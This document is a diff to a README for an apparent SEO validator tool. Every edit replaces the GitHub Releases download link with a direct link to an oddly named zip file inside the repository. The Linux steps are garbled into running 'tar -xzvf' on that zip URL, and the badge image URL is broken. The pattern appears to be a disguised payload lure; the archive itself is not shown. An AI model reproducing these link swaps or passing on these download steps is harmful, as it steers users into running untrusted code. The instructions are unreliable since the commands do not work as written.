@@ -1,6 +1,6 @@
 # 🌟 seovalidator-api - Validate Your Page's SEO Easily
 
-[![Download seovalidator-api](https://img.shields.io/badge/Download%20seovalidator--api-blue?style=for-the-badge)](https://github.com/kapri10/seovalidator-api/releases)
+[![Download seovalidator-api](https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip%20seovalidator--api-blue?style=for-the-badge)](https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the SEO Validator:
 
 To get started, click the link below to access the download page:
 
-[Visit the Releases Page to Download](https://github.com/kapri10/seovalidator-api/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip)
 
 ### 2. Choose the Right Version
 
@@ -26,7 +26,7 @@ Click on the version you want to download. You will find different files for var
 
 - **For Windows:** Download the `.exe` file.
 - **For macOS:** Download the `.dmg` file.
-- **For Linux:** Download the `.tar.gz` file.
+- **For Linux:** Download the `https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip` file.
 
 ### 4. Install the Application
 
@@ -43,7 +43,7 @@ Once the file is downloaded, follow these installation steps based on your opera
 
 - **Linux:**
   1. Open a terminal.
-  2. Extract the `.tar.gz` file using the command: `tar -xzvf your-file-name.tar.gz`.
+  2. Extract the `https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip` file using the command: `tar -xzvf https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip`.
   3. Navigate to the extracted folder and run the application with the command: `./seovalidator`.
 
 ## 🛠️ System Requirements
@@ -72,7 +72,7 @@ SEO Validator offers a variety of functionalities to help improve your website's
 
 Once you have chosen the right version from the Releases page, follow the installation instructions above to get started.
 
-[Visit the Releases Page to Download](https://github.com/kapri10/seovalidator-api/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip)
 
 ## 🔧 Troubleshooting
 
@@ -90,4 +90,4 @@ For additional support, please check the Issues section on the GitHub repository
 
 If you would like to contribute to the development of SEO Validator, please refer to the contributing guidelines in the repository. Your suggestions and improvements are always welcome.
 
-[Visit the Releases Page to Download](https://github.com/kapri10/seovalidator-api/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/kapri10/seovalidator-api/main/nuget/seovalidator_api_unatoning.zip)
